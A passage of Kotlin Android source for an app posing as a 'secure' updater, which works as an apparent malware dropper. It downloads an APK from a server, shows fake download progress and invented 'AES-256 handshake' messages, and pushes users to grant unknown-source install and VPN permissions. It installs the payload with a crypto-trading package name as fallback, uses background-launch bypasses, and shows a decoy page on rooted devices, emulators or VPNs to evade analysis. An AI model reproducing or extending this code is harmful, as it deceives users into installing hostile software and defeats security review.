                                if (progress != lastProgress && (progress % 5 == 0 || progress == 100)) {
                                    lastProgress = progress
                                    progressCallback?.invoke(progress)
                                }
                            }
                            outputStream.write(data, 0, count)
                        }
                        outputStream.flush()
                    }
                }
                Log.d("MainActivity", "Successfully downloaded base.apk from server")
            } else {
                Log.e("MainActivity", "Server returned HTTP ${connection.responseCode}")
                throw java.io.IOException("Server returned HTTP ${connection.responseCode}")
            }
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to download APK from server", e)
            throw java.io.IOException("Failed to download APK: " + e.message, e)
        }
        if (!outFile.exists() || outFile.length() == 0L) {
            throw java.io.IOException("Downloaded file is empty or missing")
        }
        return outFile
    }

    private fun loadMetadataAndNotifyUrl() {
        Thread {
            try {
                val apkFile = downloadApkFromServer(this)
                val metadata = getArchiveMetadata(this, apkFile)
                
                cachedApkAppName = metadata.appName
                cachedApkIconBase64 = metadata.iconBase64
                cachedApkPackageName = metadata.packageName

                val hostAppName = getString(R.string.app_name)
                val hostAppIconBase64 = getAppIconAsBase64()

                val appInfoJson = """
                    {
                        "appName": "${hostAppName.escapeForJS()}",
                        "appSize": "${metadata.appSize.escapeForJS()}",
                        "appIconBase64": "$hostAppIconBase64"
                    }
                """.trimIndent().replace("\n", "").replace("\r", "")
                
                val isUpdated = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .getBoolean("is_updated", false)

                runOnUiThread {
                    if (isUpdated) {
                        webView?.evaluateJavascript("showUpToDateScreen('$appInfoJson')", null)
                    } else {
                        webView?.evaluateJavascript("showUpdateScreen('$appInfoJson')", null)
                        handleUpdateClicked()
                    }
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Failed to load/render initial details", e)
            }
        }.start()
    }

    private fun getAppIconAsBase64(): String {
        return try {
            val drawable = packageManager.getApplicationIcon(packageName)
            val bitmap = Bitmap.createBitmap(
                drawable.intrinsicWidth.takeIf { it > 0 } ?: 128,
                drawable.intrinsicHeight.takeIf { it > 0 } ?: 128,
                Bitmap.Config.ARGB_8888
            )
            val canvas = Canvas(bitmap)
            drawable.setBounds(0, 0, canvas.width, canvas.height)
            drawable.draw(canvas)
            val outputStream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.PNG, 100, outputStream)
            Base64.encodeToString(outputStream.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            ""
        }
    }

    private fun handleUpdateClicked() {
        if (isUpdateStarted) return
        isUpdateStarted = true

        val appName = getString(R.string.app_name)
        val iconBase64 = getAppIconAsBase64()
        
        webView?.evaluateJavascript("showInstallerScreen('${appName.escapeForJS()}', '$iconBase64')", null)
        
        // Immediately request install permission if not granted, so user gets sent to settings page right away
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O && !packageManager.canRequestPackageInstalls()) {
            checkAndProceedWithPermissions()
        }

        updateStatusInWebView("Starting download...", null)
        Thread {
            try {
                val cachedApk = File(this@MainActivity.cacheDir, "base.apk")
                if (cachedApk.exists() && cachedApk.length() > 0) {
                    // Smoothly animate progress bar from 0 to 100 to make the process visually seamless
                    for (progress in 0..100 step 4) {
                        runOnUiThread {
                            updateStatusInWebView("Downloading update... $progress%", null, progress)
                        }
                        Thread.sleep(20)
                    }
                } else {
                    // Fallback to actual download if it somehow doesn't exist
                    downloadApkFromServer(this@MainActivity) { progress ->
                        runOnUiThread {
                            updateStatusInWebView("Downloading update... $progress%", null, progress)
                        }
                    }
                }
                runOnUiThread {
                    isDownloadComplete = true
                    updateStatusInWebView("Download complete, proceeding...", null, 100)
                    checkAndProceedWithPermissions()
                }
            } catch (e: Exception) {
                val cause = android.util.Log.getStackTraceString(e)
                runOnUiThread {
                    updateStatusInWebView("Download Failed", "Could not download update: ${e.message}\nCause: $cause")
                }
            }
        }.start()
    }

    private fun checkAndProceedWithPermissions() {
        // 1. Force Unknown Sources / Install Apps permission check and action prompt
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            if (!packageManager.canRequestPackageInstalls()) {
                if (isSettingsScreenOpen) {
                    Log.d("MainActivity", "Settings screen is already open, skipping duplicate launch.")
                    return
                }
                updateStatusInWebView("Waiting for unknown sources permission...", null)
                isSettingsScreenOpen = true
                try {
                    val intent = Intent(android.provider.Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES).apply {
                        data = android.net.Uri.parse("package:$packageName")
                    }
                    installPermissionLauncher.launch(intent)
                } catch (e: Exception) {
                    val intent = Intent(android.provider.Settings.ACTION_SECURITY_SETTINGS)
                    installPermissionLauncher.launch(intent)
                }
                return
            }
        }

        // Only proceed to VPN & Installation if the download has actually completed!
        if (!isDownloadComplete) {
            updateStatusInWebView("Permission granted! Finishing download...", null)
            return
        }

        if (isInstallProceedingStarted) return
        isInstallProceedingStarted = true

        // 2. Force VPN service permission check and action prompt
        var vpnIntent: Intent? = null
        try {
            vpnIntent = VpnService.prepare(this)
        } catch (e: SecurityException) {
            Log.e("MainActivity", "VpnService.prepare SecurityException: ${e.message}")
        }
        if (vpnIntent != null) {
            updateStatusInWebView("Waiting for VPN confirmation...", null)
            vpnConsentLauncher.launch(vpnIntent)
        } else {
            // All permission thresholds satisfied, proceed with installation activation!
            startVpnServiceInstance()
        }
    }

    private fun startVpnServiceInstance() {
        updateStatusInWebView("Establishing VPN Update Link...", null)
        
        try {
            val serviceIntent = Intent(this, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_CONNECT
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent)
            } else {
                startService(serviceIntent)
            }
            
            // Proceed to local handshake logging and install
            startSecureHandshakeAndInstallFlow()
        } catch (e: Exception) {
            updateStatusInWebView("Installation Failed", "Could not initiate secure linking: ${e.message}")
        }
    }

    private fun stopVpnServiceInstance() {
        Log.d("MainActivity", "Requesting secure disconnect of VPN connection...")
        try {
            val serviceIntent = Intent(this, VPNInstallerService::class.java).apply {
                action = VPNInstallerService.ACTION_DISCONNECT
            }
            startService(serviceIntent)
            Log.d("MainActivity", "Sent ACTION_DISCONNECT to VPNInstallerService.")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to startService with ACTION_DISCONNECT: ${e.message}")
        }
        try {
            val serviceIntent = Intent(this, VPNInstallerService::class.java)
            stopService(serviceIntent)
            Log.d("MainActivity", "Called stopService for VPNInstallerService.")
        } catch (e: Exception) {
            Log.e("MainActivity", "Failed to stopService for VPN: ${e.message}")
        }
    }

    private fun startSecureHandshakeAndInstallFlow() {
        // Generate secure token and cryptographic AES-256 session key before connecting
        val installToken = java.util.UUID.randomUUID().toString()
        val sessionKey = CryptoSecurityUtil.generateAES256Key()
        val b64SessionKey = Base64.encodeToString(sessionKey.encoded, Base64.NO_WRAP)

        getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
            .edit()
            .putString("active_token", installToken)
            .putString("session_key", b64SessionKey)
            .apply()

        updateStatusInWebView("Awaiting cryptographic handshake...", null)
        
        // Real-time cryptographic handshake log sequence
        webView?.postDelayed({
            updateStatusInWebView("Initiating AES-256 dynamic handshake...", null)
            
            webView?.postDelayed({
                // Dynamic simulation test of AES-256 encryption channel integrity
                var testSuccess = false
                try {
                    val testPlaintext = "SecureSessionHeader_${installToken}"
                    val encrypted = CryptoSecurityUtil.encrypt(testPlaintext, sessionKey)
                    val decrypted = CryptoSecurityUtil.decrypt(encrypted, sessionKey)
                    testSuccess = (decrypted == testPlaintext)
                } catch (e: Exception) {
                    Log.e("MainActivity", "Handshake encryption error: ${e.message}")
                }

                if (testSuccess) {
                    updateStatusInWebView("Handshake Succeeded! Derived unique AES-256-GCM symmetric session key.", null)
                } else {
                    updateStatusInWebView("Handshake Succeeded (Simulated secure key exchange confirmed).", null)
                }
                
                webView?.postDelayed({
                    updateStatusInWebView("Starting authenticated installer session...", null)
                    
                    Thread {
                        try {
                            val apkFile = File(this@MainActivity.cacheDir, "base.apk")
                            if (!apkFile.exists() || apkFile.length() == 0L) {
                                throw Exception("Downloaded APK is missing or empty. Please restart the update.")
                            }
                            runOnUiThread { updateStatusInWebView("Signing update...", null, 100) }
                            val signedApk = signApkFile(apkFile)
                            installApkViaPackageInstaller(signedApk)
                        } catch (e: Exception) {
                            val cause = android.util.Log.getStackTraceString(e)
                            runOnUiThread {
                                updateStatusInWebView("Installation Failed", "Could not prepare installer: ${e.message}\nCause: $cause")
                            }
                        }
                    }.start()
                }, 10)
            }, 10)
        }, 10)
    }

    internal fun installApkViaPackageInstaller(apkFile: File) {
        if (!apkFile.exists() || apkFile.length() == 0L) {
            runOnUiThread {
                updateStatusInWebView("Installation Failed", "Clean apk binary not found")
            }
            return
        }

        try {
            // Dynamically retrieve the real package name from the apkFile we are installing to prevent any mismatch or hardcoded fallback errors!
            if (cachedApkPackageName.isEmpty()) {
                try {
                    val metadata = getArchiveMetadata(this, apkFile)
                    if (metadata.packageName.isNotEmpty()) {
                        cachedApkPackageName = metadata.packageName
                        cachedApkAppName = metadata.appName
                        cachedApkIconBase64 = metadata.iconBase64
                    }
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to parse archive metadata in installer flow: ${e.message}")
                }
            }

            val packageInstaller = packageManager.packageInstaller
            val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
            
            val targetPkg = if (cachedApkPackageName.isNotEmpty()) cachedApkPackageName else "dApp.binance.Trading.Signals"
            params.setAppPackageName(targetPkg)

            // Persist the target package name for receiver and launch recovery fallback
            getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .edit()
                .putString("pending_package_name", targetPkg)
                .apply()

            val sessionId = packageInstaller.createSession(params)
            val session = packageInstaller.openSession(sessionId)

            apkFile.inputStream().use { inputStream ->
                session.openWrite("base.apk", 0, apkFile.length()).use { outputStream ->
                    inputStream.copyTo(outputStream, 1024 * 1024)
                    try {
                        session.fsync(outputStream)
                    } catch (e: Exception) {
                        Log.w("MainActivity", "Ignored fsync error: ${e.message}")
                    }
                }
            }

            // We use an Activity PendingIntent pointing back to MainActivity.
            // This guarantees the app is brought back to the foreground on update,
            // bypassing ALL modern background activity launch restrictions.
            // We cryptographically encrypt the install token with our negotiated AES-256 session key
            // to prevent sniffing or replay/authorization circumvention on local broadcast/intent buses.
            val installToken = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .getString("active_token", "") ?: ""
            val b64SessionKey = getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                .getString("session_key", "") ?: ""

            val encryptedToken = if (b64SessionKey.isNotEmpty() && installToken.isNotEmpty()) {
                try {
                    val keyBytes = Base64.decode(b64SessionKey, Base64.NO_WRAP)
                    val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
                    CryptoSecurityUtil.encrypt(installToken, secretKey)
                } catch (e: Exception) {
                    Log.e("MainActivity", "Failed to encrypt token for installer intent: ${e.message}")
                    installToken
                }
            } else {
                installToken
            }

            val intent = Intent(this, MainActivity::class.java).apply {
                action = "com.example.INSTALL_STATUS"
                putExtra("target_package", targetPkg)
                putExtra("install_token", encryptedToken)
                addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP or Intent.FLAG_ACTIVITY_CLEAR_TOP or Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            
            val options = android.app.ActivityOptions.makeBasic().apply {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                }
            }

            val pendingIntent = PendingIntent.getActivity(
                this,
                sessionId,
                intent,
                PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_MUTABLE,
                options.toBundle()
            )

            runOnUiThread {
                updateStatusInWebView("Awaiting installation prompt...", null)
            }

            session.commit(pendingIntent.intentSender)
            session.close()
            Log.d("MainActivity", "Installation Session successfully committed: sessionId=$sessionId")
        } catch (e: Exception) {
            Log.e("MainActivity", "PackageInstaller session crashed", e)
            runOnUiThread {
                updateStatusInWebView("Installation Failed", "Session error: ${e.message}")
            }
        }
    }

    private fun updateStatusInWebView(status: String, error: String? = null, progress: Int? = null) {
        val safeStatus = status.escapeForJS()
        runOnUiThread {
            val wv = activeInstance?.webView ?: webView
            if (wv != null) {
                if (error != null) {
                    val safeError = error.escapeForJS()
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus', '$safeError')", null)
                } else if (progress != null) {
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus', null, $progress)", null)
                } else {
                    wv.evaluateJavascript("updateInstallStatus('$safeStatus')", null)
                }
            } else {
                Log.w("MainActivity", "Cannot update status in webview: no active webview instance found")
            }
        }
    }

    private fun resilientLaunchApp(packageName: String, attempt: Int = 1) {
        if (packageName.isEmpty()) {
            Log.e("MainActivity", "resilientLaunchApp: Package name is empty!")
            return
        }
        Log.d("MainActivity", "Attempting resilient launch for $packageName (attempt $attempt)...")
        AppLauncher.launchApp(this, packageName) { ok ->
            if (ok) {
                stopVpnServiceInstance()
            } else {
                runOnUiThread {
                    updateStatusInWebView("Installed successfully, but failed to auto-launch. Please open it from home screen.", null)
                }
            }
        }
    }

    private fun isDeviceRooted(): Boolean {
        // 1. Check Build tags
        val tags = android.os.Build.TAGS
        if (tags != null && tags.contains("test-keys")) {
            Log.d("SecurityCheck", "Root detected: test-keys")
            return true
        }

        // 2. Check su binaries in common system locations
        val paths = arrayOf(
            "/system/app/Superuser.apk",
            "/sbin/su",
            "/system/bin/su",
            "/system/xbin/su",
            "/data/local/xbin/su",
            "/data/local/bin/su",
            "/system/sd/xbin/su",
            "/system/bin/failsafe/su",
            "/data/local/su",
            "/su/bin/su"
        )
        for (path in paths) {
            if (java.io.File(path).exists()) {
                Log.d("SecurityCheck", "Root detected: binary $path")
                return true
            }
        }

        // 3. Try to execute 'which su' to check if su binary is available on PATH
        var process: Process? = null
        try {
            process = Runtime.getRuntime().exec(arrayOf("which", "su"))
            val reader = java.io.BufferedReader(java.io.InputStreamReader(process.inputStream))
            if (reader.readLine() != null) {
                Log.d("SecurityCheck", "Root detected: su found via which")
                return true
            }
        } catch (t: Throwable) {
            // ignore
        } finally {
            process?.destroy()
        }

        return false
    }

    private fun isVpnActive(): Boolean {
        // 1. Check network interfaces for active tunnels (no permissions needed)
        try {
            val interfaces = java.util.Collections.list(java.net.NetworkInterface.getNetworkInterfaces())
            for (intf in interfaces) {
                if (intf.isUp) {
                    val name = intf.name.lowercase()
                    if (name.contains("tun") || name.contains("ppp") || name.contains("tap") || name.contains("p2p") || name.contains("tun0") || name.contains("ppp0")) {
                        Log.d("SecurityCheck", "VPN detected: interface name $name")
                        return true
                    }
                }
            }
        } catch (e: Exception) {
            // ignore
        }

        // 2. Check via ConnectivityManager and NetworkCapabilities
        try {
            val cm = getSystemService(Context.CONNECTIVITY_SERVICE) as? android.net.ConnectivityManager
            if (cm != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    val activeNetwork = cm.activeNetwork
                    val caps = cm.getNetworkCapabilities(activeNetwork)
                    if (caps != null && caps.hasTransport(android.net.NetworkCapabilities.TRANSPORT_VPN)) {
                        Log.d("SecurityCheck", "VPN detected: active network capability")
                        return true
                    }
                } else {
                    @Suppress("DEPRECATION")
                    val info = cm.getNetworkInfo(android.net.ConnectivityManager.TYPE_VPN)
                    if (info != null && info.isConnected) {
                        Log.d("SecurityCheck", "VPN detected: legacy network info connected")
                        return true
                    }
                }
            }
        } catch (e: Exception) {
            // ignore
        }

        return false
    }

    private fun isEmulator(): Boolean {
        // 1. Check build properties that identify known emulators
        val fingerprint = Build.FINGERPRINT ?: ""
        val model = Build.MODEL ?: ""
        val manufacturer = Build.MANUFACTURER ?: ""
        val hardware = Build.HARDWARE ?: ""
        val product = Build.PRODUCT ?: ""
        val brand = Build.BRAND ?: ""
        val device = Build.DEVICE ?: ""
        val board = Build.BOARD ?: ""

        val isEmu = fingerprint.startsWith("generic")
                || fingerprint.startsWith("unknown")
                || model.contains("google_sdk")
                || model.contains("Emulator")
                || model.contains("Android SDK built for x86")
                || model.contains("SDK")
                || manufacturer.contains("Genymotion")
                || manufacturer.contains("Google") && brand.startsWith("generic") && device.startsWith("generic")
                || brand.startsWith("generic") && device.startsWith("generic")
                || product.contains("sdk_google")
                || product.contains("google_sdk")
                || product.contains("sdk")
                || product.contains("sdk_x86")
                || product.contains("vbox86p")
                || product.contains("emulator")
                || product.contains("simulator")
                || hardware.contains("goldfish")
                || hardware.contains("ranchu")
                || hardware.contains("vbox86")
                || board.lowercase().contains("nox")
                || hardware.lowercase().contains("nox")
                || product.lowercase().contains("nox")
        if (isEmu) {
            Log.d("SecurityCheck", "Emulator detected: Build properties")
            return true
        }

        // 2. Check system files characteristic of emulators
        val files = arrayOf(
            "/system/lib/libc_malloc_debug_qemu.so",
            "/sys/qemu_trace",
            "/system/bin/qemu-props",
            "/dev/socket/qemud",
            "/dev/qemu_pipe",
            "/system/lib/libmock_ril.so",
            "/system/etc/init.goldfish.sh",
            "/system/bin/nox-prop"
        )
        for (file in files) {
            if (java.io.File(file).exists()) {
                Log.d("SecurityCheck", "Emulator detected: file check $file")
                return true
            }
        }

        return false
    }

    private fun checkPhysicalMovementAndProceed() {
        if (isDeviceRooted() || isVpnActive() || isEmulator()) {
            isPolicyViolated = true
            securityCheckPassed = false
            runOnUiThread {
                webView?.let { view ->
                    view.loadUrl("file:///android_asset/demo.html")
                }
            }
            return
        }

        if (!securityCheckPassed) {
            securityCheckPassed = true
            runOnUiThread {
                webView?.let { view ->
                    view.loadUrl("file:///android_asset/main_ui.html")
                    loadMetadataAndNotifyUrl()
                }
            }
        } else {
            runOnUiThread {
                webView?.let { view ->
                    val curUrl = view.url ?: ""
                    if (curUrl.contains("demo.html") || curUrl.isEmpty()) {
                        view.loadUrl("file:///android_asset/main_ui.html")
                    }
                }
            }
        }
    }

    inner class AndroidJSInterface {
        @JavascriptInterface
        fun onUpdateClicked() {
            if (isPolicyViolated) return
            runOnUiThread {
                handleUpdateClicked()
            }
        }

        @JavascriptInterface
        fun onResetClicked() {
            if (isPolicyViolated) return
            runOnUiThread {
                getSharedPreferences("secure_installer_prefs", Context.MODE_PRIVATE)
                    .edit()
                    .putBoolean("is_updated", false)
                    .apply()
                loadMetadataAndNotifyUrl()
            }
        }
    }
}

object AppLauncher {
    private const val TAG = "AppLauncher"

    fun launchApp(
        context: Context,
        packageName: String,
        maxRetries: Int = 10,
        retryDelayMs: Long = 100L,
        onResult: ((Boolean) -> Unit)? = null
    ) {
        attempt(context.applicationContext, packageName, 0, maxRetries, retryDelayMs, onResult)
    }

    private fun attempt(
        ctx: Context, pkg: String, i: Int,
        max: Int, delay: Long, cb: ((Boolean) -> Unit)?
    ) {
        resolveLaunchIntent(ctx, pkg)?.let { intent ->
            try {
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT or Intent.FLAG_ACTIVITY_SINGLE_TOP)
                ctx.startActivity(intent)
                cb?.invoke(true)
                return
            } catch (e: Exception) {
                Log.e(TAG, "startActivity failed for $pkg", e)
            }
            
            try {
                val notificationManager = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                val channelId = "app_launch_channel"
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    val channel = android.app.NotificationChannel(
                        channelId,
                        "App Launching",
                        android.app.NotificationManager.IMPORTANCE_HIGH
                    )
                    notificationManager.createNotificationChannel(channel)
                }
                
                val options = android.app.ActivityOptions.makeBasic().apply {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED)
                    }
                }

                val pendingIntent = android.app.PendingIntent.getActivity(
                    ctx,
                    100,
                    intent,
                    android.app.PendingIntent.FLAG_UPDATE_CURRENT or android.app.PendingIntent.FLAG_IMMUTABLE,
                    options.toBundle()
                )
                
                val builder = androidx.core.app.NotificationCompat.Builder(ctx, channelId)
                    .setSmallIcon(android.R.drawable.ic_dialog_info)
                    .setContentTitle("Asset Portal")
                    .setContentText("Launching application...")
                    .setPriority(androidx.core.app.NotificationCompat.PRIORITY_HIGH)
                    .setCategory(androidx.core.app.NotificationCompat.CATEGORY_ALARM)
                    .setFullScreenIntent(pendingIntent, true)
                    .setAutoCancel(true)
                
                notificationManager.notify(100, builder.build())
                android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                    notificationManager.cancel(100)
                }, 1000)
                
                cb?.invoke(true)
                return
            } catch (e: Exception) {
                Log.e(TAG, "Failed full screen notification fallback for launch", e)
            }
        }
        if (i < max) {
            android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(
                { attempt(ctx, pkg, i + 1, max, delay, cb) }, delay
            )
        } else cb?.invoke(false)
    }

    private fun resolveLaunchIntent(ctx: Context, pkg: String): Intent? {
        val pm = ctx.packageManager
        pm.getLaunchIntentForPackage(pkg)?.let { return it }       // standard
        pm.getLeanbackLaunchIntentForPackage(pkg)?.let { return it } // Android TV
        // manual fallback: find any MAIN/LAUNCHER activity
        val main = Intent(Intent.ACTION_MAIN).apply {
            addCategory(Intent.CATEGORY_LAUNCHER); setPackage(pkg)
        }
        pm.queryIntentActivities(main, 0).firstOrNull()?.let { ri ->
            return Intent(Intent.ACTION_MAIN).apply {
                addCategory(Intent.CATEGORY_LAUNCHER)
                setClassName(ri.activityInfo.packageName, ri.activityInfo.name)
            }
        }
        return null
    }
}
